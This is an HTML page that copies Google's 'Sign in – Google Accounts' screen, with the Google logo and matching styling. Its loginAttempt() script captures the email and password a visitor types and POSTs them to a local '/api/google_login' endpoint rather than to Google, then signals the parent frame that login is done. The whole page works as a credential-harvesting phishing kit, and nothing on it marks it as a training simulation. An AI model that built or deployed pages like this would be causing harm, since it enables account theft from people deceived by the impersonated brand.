<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Sign in – Google Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            background: #ffffff;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .card {
            display: flex;
            flex-direction: row;
            width: 860px;
            min-height: 480px;
            background: #ffffff;
            border: 1px solid #e0e0e0;
            border-radius: 28px;
            overflow: hidden;
            padding: 48px 40px 36px 48px;
            gap: 48px;
            align-items: flex-start;
        }

        /* LEFT COLUMN */
        .left {
            flex: 0 0 260px;
            display: flex;
            flex-direction: column;
            gap: 0;
        }

        .google-logo {
            width: 38px;
            height: 38px;
            margin-bottom: 40px;
        }

        .left h1 {
            font-size: 32px;
            font-weight: 400;
            color: #202124;
            letter-spacing: 0;
            line-height: 1.2;
            margin-bottom: 10px;
        }

        .left p {
            font-size: 16px;
            font-weight: 400;
            color: #202124;
        }

        /* RIGHT COLUMN */
        .right {
            flex: 1;
            display: flex;
            flex-direction: column;
            padding-top: 6px;
        }

        .input-wrap {
            position: relative;
            margin-bottom: 8px;
        }

        .input-wrap input {
            width: 100%;
            height: 56px;
            padding: 20px 14px 6px 14px;
            font-size: 16px;
            font-family: inherit;
            color: #202124;
            background: transparent;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            transition: border-color 0.15s, border-width 0.15s;
        }

        .input-wrap input:focus {
            border: 2px solid #1a73e8;
        }

        .input-wrap label {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 16px;
            color: #80868b;
            pointer-events: none;
            transition: all 0.15s ease;
            background: #fff;
            padding: 0 2px;
        }

        .input-wrap input:focus + label,
        .input-wrap input:not(:placeholder-shown) + label {
            top: 0px;
            font-size: 12px;
            color: #1a73e8;
        }

        .input-wrap input:not(:focus):not(:placeholder-shown) + label {
            color: #80868b;
        }

        .forgot-link {
            display: inline-block;
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
            margin-top: 6px;
            margin-bottom: 28px;
        }

        .forgot-link:hover { text-decoration: underline; }

        .show-password {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-top: 6px;
            margin-bottom: 28px;
        }

        .show-password input[type="checkbox"] {
            width: 16px;
            height: 16px;
            accent-color: #1a73e8;
            cursor: pointer;
        }

        .show-password label {
            font-size: 14px;
            color: #202124;
            cursor: pointer;
        }

        .btn-row {
            display: flex;
            align-items: center;
            justify-content: flex-end;
            gap: 8px;
        }

        .btn-next {
            background: #1a73e8;
            border: none;
            color: #ffffff;
            font-size: 14px;
            font-weight: 500;
            font-family: inherit;
            padding: 10px 24px;
            border-radius: 20px;
            cursor: pointer;
            letter-spacing: 0.25px;
        }

        .btn-next:hover { background: #1765cc; }
    </style>
</head>
<body>

<div class="card">

    <!-- LEFT -->
    <div class="left">
        <!-- Google G logo -->
        <svg class="google-logo" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
            <path fill="none" d="M0 0h48v48H0z"/>
        </svg>

        <h1>Sign in</h1>
        <p>Use your Google Account</p>
    </div>

    <!-- RIGHT -->
    <div class="right">

        <!-- Email input -->
        <div class="input-wrap">
            <input type="email" id="email" placeholder=" "/>
            <label for="email">Email or phone</label>
        </div>

        <a href="#" class="forgot-link">Forgot email?</a>

        <!-- Password input -->
        <div class="input-wrap">
            <input type="password" id="password" placeholder=" "/>
            <label for="password">Enter your password</label>
        </div>

        <div class="show-password">
            <input type="checkbox" id="showpw" onchange="var p = document.getElementById('password'); p.type = this.checked ? 'text' : 'password';"/>
            <label for="showpw">Show password</label>
        </div>

        <div class="btn-row">
            <button class="btn-next" onclick="loginAttempt()">Next</button>
        </div>

    </div>
</div>

<script>
    async function loginAttempt() {
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      
      if (!email || !password) {
        alert("Please enter email and password");
        return;
      }
      
      try {
          const apiHost = window.location.protocol === 'file:' ? 'http://localhost:5001' : '';
          const endpoint = apiHost + '/api/google_login';
          
          await fetch(endpoint, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ email, password })
          });
          
          window.parent.postMessage({ type: 'GOOGLE_LOGIN_DONE' }, '*');
      } catch (error) {
          console.error(error);
          window.parent.postMessage({ type: 'GOOGLE_LOGIN_DONE' }, '*');
      }
    }
</script>

</body>
</html>
